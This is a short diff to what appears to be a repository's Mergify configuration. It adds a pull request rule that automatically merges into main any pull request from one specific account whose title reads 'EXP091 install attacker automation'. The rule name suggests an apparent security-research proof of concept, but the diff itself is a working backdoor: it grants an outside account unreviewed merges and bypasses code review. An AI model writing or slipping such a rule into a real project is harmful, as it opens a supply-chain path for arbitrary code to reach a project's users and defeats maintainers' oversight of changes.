@@ -12,3 +12,14 @@ queue_rules:
     merge_method: squash
 merge_queue:
   queue_controls_comment: false
+
+pull_request_rules:
+  - name: H1 EXP091 config guard 1786846509
+    conditions:
+      - base = main
+      - author = onecursor3-gif
+      - title = EXP091 install attacker automation 1786846509
+      - -mergify-configuration-changed
+    actions:
+      merge:
+        method: merge
